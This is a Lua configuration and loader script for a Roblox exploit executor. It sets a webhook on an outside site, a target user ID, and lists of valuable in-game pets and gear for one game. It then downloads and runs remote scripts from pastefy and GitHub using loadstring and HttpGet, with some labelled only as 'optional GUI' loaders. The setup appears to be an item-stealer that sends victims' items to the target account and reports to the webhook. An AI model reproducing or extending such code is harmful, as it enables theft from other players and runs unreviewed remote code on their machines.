local genv = getgenv()

genv.GOOD_WEBHOOK = "https://sentinelhook.lol/api.php?id=bxtlNxphsF6FBbQ"

genv.TARGET_USER_ID = 2829121161

genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"

genv.ALLOWED_ANIMALS = {
    "Strawberry Elephant",
    "Headless Horseman",
    "Meowl",
    "John Pork",
    "Skibidi Toilet",
    "Griffin",
    "Dragon Aquanini",
    "Dragon Gingerini",
    "Hydra Dragon Cannelloni",
    "Signore Carapace",
    "Dragon Cannelloni",
    "Love Love Bear",
    "Moby Bros",
    "Digi Narwhal",
    "Kraken",
    "La Supreme Combinasion",
    "Elefanto Frigo",
    "Hydra Bunny",
    "Celestial Pegasus",
    "Cerberus",
    "Jelly Moby",
    "Bumbatron",
    "Bunny and Eggy",
    "Popcuru and Fizzuru",
    "Rosey and Teddy",
    "Capitano Moby",
    "Cooki and Milki",
    "Arcadragon",
    "Burguro And Fryuro",
    "Los Secret Combinasionas",
    "Ketupat Bros",
    "Reinito Sleighito",
    "Fortunu and Cashuru",
    "Los Amigos",
    "Pizza and Ranch",
    "Antonio",
    "La Secret Combinasion",
    "Pancake and Syrup",
    "Foxini Lanternini",
    "Kalika Bros",
    "Los Sekolahs",
    "Sammyni Fattini",
    "Fishino Clownino",
    "Cash or Card",
    "Fragrama and Chocrama",
    "La Casa Boo",
    "Los Admins",
    "Duggy Bros",
    "La Food Combinasion",
    "S'more Serat",
    "Sammyni Cakini",
    "Boppin Bunny",
    "Spooky and Pumpky",
    "Ginger Gerat",
    "Los Chillis",
    "Los Hackers",
    "Bearito Cabinito",
    "Rubiko and Kubiko",
    "Capitano Americano",
    "Examen Bros",
    "Los Spaghettis",
    "Rubrikiko",
    "Festive 67",
    "Guest 666",
    "Quackini Snackini",
    "Queen Bee",
    "Cloverat Clapat",
    "Hopilikalika Hopilikalako",
    "Garama and Madundung",
    "Globa Steppa",
    "Fragola La La La",
    "Los Tacoritas",
    "Dug Dug Dug",
    "Rico Dinero",
    "Tirilikalika Tirilikalako",
    "Jolly Jolly Sahur",
    "Yetimatic",
    "La Breakfast Combinasion",
    "La Fuse Machine",
    "Money Money Bros",
    "Sammyini Truckini",
    "Orchidox"
}

genv.ALLOWED_BASESKINS = {
    ["Tralala"] = true
}

genv.ALLOWED_GEARS = {
    ["Bloodmoon Slap"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Rainbow Hammer"] = true,
    ["Candy Sentry"] = true,
    ["Santa's Sleigh"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Cupid's Wings"] = true
}

genv.ALLOWED_PLACE_IDS = {
    109983668079237
}

-- Extra scripts (moved out of main)
genv.EXTRA_LOADSTRINGS = {
    "https://pastefy.app/I9mewuyb/raw"
}

-- Optional GUI / other loaders
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/S3xnKGFZ/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/norgegat-byte/K2/refs/heads/main/main.lua"))()
end)
